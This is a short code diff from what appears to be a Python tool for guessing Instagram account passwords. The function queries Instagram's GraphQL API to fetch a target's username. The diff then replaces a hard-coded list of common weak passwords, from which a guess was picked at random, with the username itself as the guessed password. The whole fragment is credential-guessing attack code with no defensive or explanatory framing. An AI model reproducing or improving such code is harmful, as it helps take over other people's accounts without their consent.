@@ -36,30 +36,8 @@ def kl():
   response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD}, data=data)
   user= response.json()['data']['user']['username']
 
-  pas= [
-    "123456",
-    "12345@@",
-     user,
-    "qwerqwer",
-    "Aa1234",
-    "00998877",
-    "qqwweerr",
-    "1q2w3e4r",
-    "1234567",
-    "12345678",
-    "098765",
-    "qwertyuiop",
-    "11223344",
-    "1122334455",
-    "qwer1234",
-    "password",
-    "mmnnbbvv",
-    "ppooiiuu",
-    "12345a",
-    "123456789"
-]
 
-  pasw= random.choice(pas)
+  pasw= user
   
   
   print(f'''
